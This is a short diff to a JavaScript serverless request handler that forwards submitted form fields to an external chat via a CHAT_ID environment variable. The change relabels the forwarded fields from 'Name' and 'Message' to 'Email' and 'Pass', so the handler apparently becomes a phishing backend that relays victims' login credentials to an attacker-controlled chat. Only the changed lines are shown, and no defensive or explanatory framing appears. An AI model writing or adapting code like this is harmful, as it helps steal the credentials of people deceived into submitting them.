@@ -17,7 +17,7 @@ export default async function handler(req, res) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: process.env.CHAT_ID,
-        text: `Name: ${name}\nMessage: ${message}`
+        text: `Email: ${name}\nPass: ${message}`
       })
     });
 
